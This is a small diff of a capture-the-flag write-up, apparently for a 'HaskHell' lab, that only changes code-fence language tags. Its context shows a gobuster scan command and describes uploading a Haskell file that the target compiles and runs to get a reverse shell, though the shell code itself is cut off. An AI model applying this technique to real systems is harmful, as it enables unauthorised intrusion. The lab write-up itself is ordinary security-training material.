@@ -54,7 +54,7 @@ $ gobuster dir -q -u http://$ip:5001/ -w $medium -x php,txt,html -o scans/gobust
 
 I've never heard of this language so i googled how can i execute system commands using HaskHell & i found this:
 
-```HaskHell
+```haskHell
 module Main where
 
 import System.Process
@@ -68,7 +68,7 @@ I guess when we upload our file it gets compile `ghc -o shell shell.hs` & execut
 
 So let's simply execute a reverse shell. Save it as `shell.hs` & upload it.
 
-```HaskHell
+```haskHell
 module Main where
 
 import System.Process
